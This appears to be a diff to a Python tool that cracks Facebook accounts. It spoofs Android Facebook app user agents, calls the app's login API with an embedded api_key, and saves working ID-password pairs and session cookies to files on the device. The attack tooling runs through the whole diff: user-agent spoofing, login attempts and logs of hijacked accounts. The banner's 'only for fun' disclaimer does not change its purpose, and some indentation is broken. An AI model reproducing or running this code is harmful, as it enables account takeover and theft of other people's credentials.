@@ -1,4 +1,9 @@
 #---------ua-def----------#
+def CHERRY():
+	ios_version = random.choice(["10_0_2","10_1_1","1 0_2","10_2_1","10_3_1","10_3_2","10_3_31"])
+    END = "[FBAN/FB4A;FBAV/61.0.0.15.69;FBBV/ 20748118;FBDM/'+'{density=3.0,width=10 80,height=1776}'+';FBLC/en_'+'US;'+'FBCR/ Vi'+'deo'+'tr'+'on;FBMF/m'+'otor'+'ola;FBBD/ mo'+'tor'+'ola;FBPN/com.facebook.katana;FBDV/ X'+'T156'+'3;FBSV/6.0;nullFBCA/ armeabi-v7a:armeabi;]"
+	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Androd 13; moto g72 Build/T2SVS33.68-21-8-2)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; HEYOU30 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-CC44 Build/65.1.A.7.133)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/AP21.240119.009)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one Build/PPKS29.68-16-21-5)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 neo Build/T3TM33.23-141-2)","Dalvik/2.1.0 (Linux; U; Android 14; SM-F721U1 Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 11; MYMobile Build/RQ2A.210505.003)","Dalvik/2.1.0 (Linux; U; Android 11; Arcelik Android UHD TV Build/RTM7.230903.072)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; A1P Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 13; SH-M19 Build/S8014)","Dalvik/2.1.0 (Linux; U; Android 13; Npad X1 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R121-15699.72.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A705FN Build/TQ3A.230805.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto g13 Build/THAS33.31-40-2)","Dalvik/2.1.0 (Linux; U; Android 13; TMAF035G Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; MP27 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; HEY2-W09 Build/HONORHEY2-W09)","Dalvik/2.1.0 (Linux; U; Android 13; AIMATE Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12.1; XBOX Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 14; moto g24 Build/UTAS34.82-21-2)","Dalvik/2.1.0 (Linux; U; Android 11; AI PONT NA Build/RTM6.230109.134)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; 40LEX_7158_FTS2C Build/NMF26Q)","Dalvik/2.1.0 (Linux; U; Android 9; INE-AL00 Build/HUAWEIINE-AL00)","Dalvik/2.1.0 (Linux; U; Android 12; S70 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 14; V2246 Build/UP1A.231005.007_MOD1)","Dalvik/2.1.0 (Linux; U; Android 14; RMX3472 Build/UKQ1.230924.001)","Dalvik/2.1.0 (Linux; U; Android 7.0; SO-05G Build/32.3.D.0.116)","Dalvik/2.1.0 (Linux; U; Android 14; 2109119DG Build/UKQ1.231108.001)","Dalvik/2.1.0 (Linux; U; Android 11; AiPlus2K Build/RTM6.230109.281)","Dalvik/2.1.0 (Linux; U; Android 13; CP20_PRO Build/TQ1A.230105.002.A1)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7a Build/AP1A.240305.019.A1)","Dalvik/2.1.0 (Linux; U; Android 11; K7 Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 11; SmartTV Build/RTM7.230804.001)","Dalvik/2.1.0 (Linux; U; Android 11; W-V745-TVM Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 14; SCG16 Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R121-15699.72.0)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge (2022) Build/T2STS33.105-51-11-3)","Dalvik/2.1.0 (Linux; U; Android 9; SCG02 Build/PPR1.180720.122)","Dalvik/2.1.0 (Linux; U; Android 11; JVC 2K ISDB TV Build/RTK2.230523.052)","Dalvik/2.1.0 (Linux; U; Android 14; 2312DRA50G Build/UKQ1.231003.002)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; rk3288 Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 11; ADVANNASAPro Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; KM9 Build/OPM1.171019.011)","Dalvik/2.1.0 (Linux; U; Android 13; PGBM10 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 14; moto g 5G - 2023 Build/U1TPN34.26-48-2)","Dalvik/2.1.0 (Linux; U; Android 14; NX769J Build/UKQ1.230917.001)","Dalvik/2.1.0 (Linux; U; Android 11; AISPLAYBOX Build/RTT0.210829.002)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 6 Build/AP1A.240305.019.A1)","Dalvik/2.1.0 (Linux; U; Android 13; motorola razr 2022 Build/T3SLS33.16-22-7-2)","Dalvik/2.1.0 (Linux; U; Android 14; V2320 Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 13; C5L Max Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; Stream TV Build/RTT4.230210.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TNS33.14-90-9-6)","Dalvik/2.1.0 (Linux; U; Android 9; LH9910 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 12; moto g22 Build/STAS32.79-77-28-55-13)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOWS32.121-66-10)","Dalvik/2.1.0 (Linux; U; Android 11; QBELL Android TV Build/RTO5.230515.001)","Dalvik/2.1.0 (Linux; U; Android 14; SM-A236U1 Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 10; Tourobox_V2 Build/Tourobox_V2)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R121-15699.72.0)","Dalvik/2.1.0 (Linux; U; Android 14; SM-A042M Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 9; AQUOS-TVX19A Build/PTM5.200218.474)","Dalvik/2.1.0 (Linux; U; Android 13; TANK 01 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; X96MAX Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13.0; TX10 PRO Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 13; moto g stylus 5G (2022) Build/T2SDS33.75-38-1-6)","Dalvik/2.1.0 (Linux; U; Android 13; moto g 5G (2022) Build/T1SAS33.73-40-71-1)","Dalvik/2.1.0 (Linux; U; Android 14; V2208 Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 10; V2031EA Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 7.0; S29 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G22 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 14; RMX3474 Build/UKQ1.230924.001)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/AP1A.240305.019.A1)","Dalvik/2.1.0 (Linux; U; Android 14; SM-A256N Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 14; SM-T227U Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; HighNet Build/HighNet)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/AP1A.240305.019.A1)","Dalvik/2.1.0 (Linux; U; Android 14; 2211133C Build/UKQ1.230804.001)","Dalvik/2.1.0 (Linux; U; Android 14; NE2217 Build/UKQ1.230924.001)","Dalvik/2.1.0 (Linux; U; Android 10; P401 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; R7Plusm Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 11; BGH Smart TV Build/RTM3.211215.196)","Dalvik/2.1.0 (Linux; U; Android 12; SH-S70 Build/SA144)","Dalvik/2.1.0 (Linux; U; Android 7.0; T400 3G 2017 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 12; F-41A Build/V70R063B)","Dalvik/2.1.0 (Linux; U; Android 13; at30a7 Build/TQ1A.230205.002)","Dalvik/2.1.0 (Linux; U; Android 11; DP700A3D-A09UK Build/RSV1.210329.052)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 30 Build/T1RDS33.116-33-15-1)","Dalvik/2.1.0 (Linux; U; Android 12; AIVI2_N_DA2 Build/SQ3A.220705.003.A1)","Dalvik/2.1.0 (Linux; U; Android 14; SM-X205 Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 13; T10M Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; E11 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; Hisense E50i Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; 2K TV Build/PTO7.210601.001)","Dalvik/2.1.0 (Linux; U; Android 14; motorola edge 30 ultra Build/U1SQS34.52-21-1-4)","Dalvik/2.1.0 (Linux; U; Android 13; brya Build/R121-15699.66.0)","Dalvik/2.1.0 (Linux; U; Android 14; moto g53 5G Build/U1TPS34.29-37-2-1)","Dalvik/2.1.0 (Linux; U; Android 13; moto g 5G (2022) Build/T1SAS33.73-40-0-6-2)","Dalvik/2.1.0 (Linux; U; Android 9.0.0; SENIC Build/NHG47K)"])+END
+	return ua 
 
 import os,zlib
 
@@ -248,7 +253,8 @@ logo =                                          """
 [x] Version  : 0.1
 [x] Tool     : Free 
 <============================================>
-\033[1;91m [x] PARTNERS= ANJISH, ANKIT,AADITYA
+\033[1;91m [x] PARTNERS= ANJISH, ANKIT
+\033[1;97m [x] THIS COMMAND IS ONLY FOR FUN
 \033[1;97m [x] DO NOT USE THIS TO HARM OTHERS
 \033[1;92m [x] DO NOT SELL THIS COMMAND
 \033[1;92m [x] NOBITA BRAND TOP 
@@ -308,9 +314,9 @@ def NOBITA():
     os.system('clear')
     print(logo)
     print(f'[1] File Crack')
-#   print(f'[9] Public ID Crack')
+#    print(f'[9] Public ID Crack')
     print(f'[2] Random Crack ')
-     print(f'[4] Create File')
+#    print(f'[4] Create File')
 #    print(f'[5] Login Tool')
 #    print(f'[6] Logout Cookie')
 #    print(f'[7] Separate Ids')
@@ -335,7 +341,7 @@ def NOBITA():
     elif select =='8':
        sids()
     elif select =='3':
-    	os.system('xdg-open https://www.facebook.com/profile.php?id=100077218767705&mibextid=ZbWKwL')
+    	os.system('xdg-open https://www.facebook.com/profile.php?id=100084565670977')
        
     
     else:
@@ -347,9 +353,9 @@ def method_crack():
     global methods
     clear()
     print(f'[1] Method {1}')
-    print(f'[2] Method {2}')
-    print(f'[3] Method {3}')
-    print(f'[4] Method {4}')
+#    print(f'[2] Method {2}')
+#    print(f'[3] Method {3}')
+#    print(f'[4] Method {4}')
     print(f'[0] Back')
     print('')
     option = input('Select method>: ')
@@ -378,7 +384,7 @@ class main_crack():
     def crack(self,id):
         global methods
         clear()
-        print(f'{S}Example: /sdcard/nobita.txt]')
+        print(f'{S}Example: /sdcard/FILE.txt]')
         
         self.file = input('Put File Name : ')
         try:
@@ -427,12 +433,12 @@ class main_crack():
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
 "api_key": "882a8490361da98702bf97a021ddc14d"}
-     headers = {
+                headers = {
     'authority': 'm.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start*]*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
     'cache-control': 'max-age=0',
-    # 'cookie': 'datr=mibwZXOje3-NYOKqvTrZ2-DB; sb=mibwZVklOOUI9JV3zirVqbJc; m_pixel_ratio=2.061462879180908; wd=891x1685; fr=0yVf63NU3fdbr6Qgc..Bl8Caa..AAA.0.0.Bl8CbC.AWUbTf2HU3c',
+    # 'cookie': 'datr=_Er1ZSTg0Vc0jw4F4jhUravk; sb=_Er1ZQ-mjUEOtdKN6-vo21oI; m_pixel_ratio=2.061462879180908; wd=891x1685; ps_l=0; ps_n=0; fr=0V8Pisx7mr3AO6mQM..Bl9Ur8..AAA.0.0.Bl9Usi.AWVXUigRxcs',
     'dpr': '1.875',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
@@ -456,7 +462,7 @@ class main_crack():
                     oks.append(sid)
                     open('/sdcard/NOBITA_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/NOBITA_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
-                elif 'm.facebook.com' in q['error']['message']:
+                elif 'www.facebook.com' in q['error']['message']:
                      print(f"\r{A} [NOBITA-CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/NOBITA_CP.txt','a').write(sid+'|'+ps+'\n')
